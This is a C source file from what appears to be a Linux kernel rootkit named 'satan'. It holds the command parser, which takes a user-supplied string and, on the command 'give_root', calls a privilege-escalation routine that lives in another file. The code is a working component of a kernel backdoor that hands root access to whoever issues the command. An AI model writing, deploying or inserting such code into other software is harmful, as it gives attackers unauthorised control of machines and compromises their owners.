// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "command.h"

#include <linux/string.h>
#include <linux/uaccess.h>

#include "privesc.h"


#define CMD_BUF_SIZE 128

static char buf[CMD_BUF_SIZE] = {0};
static char *arg = NULL;


/**
 * satan_command_parse() - Parses a user's command.
 * @cmd: user's command.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_command_parse(const char *cmd)
{
        int ret = 0;

        memset(buf, 0, CMD_BUF_SIZE);
        strncpy(buf, cmd, CMD_BUF_SIZE - 1);

        arg = strnchr(buf, CMD_BUF_SIZE - 1, ' ');
        
        if (arg)
                *arg++ = 0;
       

        pr_info("satan: command: received (%s,%s)\n", buf, arg);

        // At this point:
        // 1. `buf` points to the command string.
        // 2. `arg` points to the argument string.
        if (!strncmp(buf, "give_root", CMD_BUF_SIZE - 1)) {
                satan_privesc_root(arg);
        } else {
                pr_info("satan: unknown command: %s\n", buf);
                ret = 1;
        }

        return ret;
}
